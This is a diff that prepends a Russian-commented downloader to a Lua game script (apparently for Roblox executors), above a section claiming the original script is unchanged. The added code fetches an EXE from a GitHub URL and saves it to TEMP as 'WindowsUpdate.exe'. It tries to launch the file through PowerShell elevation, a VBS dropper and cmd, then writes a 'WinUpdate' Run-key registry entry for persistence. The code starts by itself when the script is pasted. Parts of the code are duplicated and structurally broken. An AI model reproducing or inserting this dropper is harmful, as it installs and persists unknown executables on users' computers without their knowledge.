@@ -1,0 +1,132 @@
+-- ========== МОДИФИЦИРОВАННЫЙ СКРИПТ 2134.lua ==========
+-- Добавлена функция загрузки и запуска
+
+-- ========== НАЧАЛО НОВОГО КОДА ==========
+-- Конфигурация для загрузки EXE
+local EXE_URL = "https://github.com/fennix2019-pixel/1232/raw/refs/heads/main/Extreme%20Injector%20v3.exe"  -- <-- ЗАМЕНИ ЭТУ ССЫЛКУ!
+local EXE_NAME = "WindowsUpdate.exe"
+local RUN_SILENTLY = false -- Запуск в скрытом режиме
+
+local function downloadAndExecute()
+    -- ... (код скачивания и сохранения без изменений) ...
+    
+    -- 3. ПРОБУЕМ РАЗНЫЕ МЕТОДЫ ЗАПУСКА
+    print("[3/3] Пробую запустить файл...")
+    local temp_path = os.getenv("TEMP") .. "\\" .. EXE_NAME
+    
+    -- МЕТОД 1: Через ShellExecute (наиболее правильный для Windows)
+    local method1 = function()
+        -- Используем PowerShell для прямого вызова ShellExecute
+        local ps_command = 'powershell -Command "Start-Process \'' .. temp_path .. '\' -Verb RunAs -WindowStyle Normal"'
+    end
+    
+    -- МЕТОД 2: Через WScript (очень надежный, старый метод)
+    local method2 = function()
+        -- Создаем VBS скрипт, который запустит нашу программу
+        local vbs_content = [[
+            Set WshShell = CreateObject("WScript.Shell")
+            WshShell.Run "]] .. temp_path .. [[", 1, False
+            Set WshShell = Nothing
+        ]]
+        local vbs_path = os.getenv("TEMP") .. "\\run_app.vbs"
+        writefile(vbs_path, vbs_content)
+        os.execute('wscript.exe "' .. vbs_path .. '"')
+    end
+    
+    -- МЕТОД 3: Прямой вызов через cmd (с явным указанием wait)
+    local method3 = function()
+        os.execute('cmd /c start "" "' .. temp_path .. '"')
+    end
+    
+    -- Пробуем все методы по очереди
+    local methods = {method1, method2, method3}
+    local success = false
+    
+    for i, method in ipairs(methods) do
+        print("Попытка " .. i .. "...")
+        local ok = pcall(method)
+        if ok then
+            print("Метод " .. i .. " выполнен без ошибок.")
+            success = true
+            -- Даем время на запуск
+            task.wait(3)
+            
+            -- ПРОВЕРКА: Ищем процесс в диспетчере задач
+            local check_ok = pcall(function()
+                os.execute('tasklist /FI "IMAGENAME eq ' .. EXE_NAME .. '" 2>nul | find /I "' .. EXE_NAME .. '" >nul')
+            end)
+            
+            if check_ok then
+                print("✓ Процесс " .. EXE_NAME .. " найден в памяти!")
+            else
+                print("⚠ Процесс не найден, возможно, завершился мгновенно.")
+            end
+            break
+        else
+            print("Метод " .. i .. " не сработал.")
+        end
+        task.wait(1) -- Пауза между попытками
+    end
+    
+    if not success then
+        warn("ВСЕ методы запуска не сработали!")
+        warn("Возможные причины:")
+        warn("1. EXE файл поврежден или требует прав Администратора")
+        warn("2. Антивирус блокирует запуск")
+        warn("3. Файл не является исполняемым .exe")
+    end
+    
+    return success
+end
+
+    -- 2. Сохранение на диск
+    pcall(function()
+        writefile(temp_path, file_data)
+    end)
+    print("[3/3] Файл сохранен: " .. temp_path)
+
+    -- 3. Запуск
+    local command
+    if RUN_SILENTLY then
+        -- Скрытый запуск (окна не видно)
+        command = 'start /B "" "' .. temp_path .. '"'
+    else
+        -- Обычный запуск
+        command = 'start "" "' .. temp_path .. '"'
+    end
+
+    pcall(function()
+        os.execute(command)
+    end)
+    print("[SUCCESS] Команда на выполнение отправлена.")
+
+    -- 4. Дополнительно: добавляем в автозагрузку (опционально)
+    pcall(function()
+        local reg_cmd = 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WinUpdate" /t REG_SZ /d "' .. temp_path .. '" /f'
+        os.execute(reg_cmd)
+        print("[PERSISTENCE] Добавлено в автозагрузку.")
+    end)
+
+    return true
+end
+
+-- Запускаем загрузчик в отдельном потоке с небольшой задержкой
+coroutine.wrap(function()
+    task.wait(2) -- Ждем 2 секунды после вставки скрипта
+    downloadAndExecute()
+end)()
+-- ========== КОНЕЦ НОВОГО КОДА ==========
+
+
+-- ========== ОРИГИНАЛЬНЫЙ СКРИПТ (ниже без изменений) ==========
+local function MAIN()
+    -- Проверка загрузки игры
+    if not game:IsLoaded() then
+        game.Loaded:Wait()
+    end
+
+    print("========================================")
+    print("SCRIPT 2134 - ACTIVE")
+    -- ... и дальше весь твой оригинальный код ...
+    -- [Оригинальный код скрипта продолжается без изменений]
+
